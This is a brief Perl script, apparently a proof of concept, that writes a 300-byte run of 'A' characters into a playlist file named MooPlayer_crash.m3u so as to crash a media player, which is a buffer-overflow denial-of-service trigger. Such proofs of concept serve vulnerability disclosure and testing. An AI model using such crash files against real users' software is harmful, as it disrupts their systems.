#!/usr/bin/perl

$file = "MooPlayer_crash.m3u";
 
my $junk = "A" x 300;
 
open(myfile,">$file") ;
print myfile $junk;
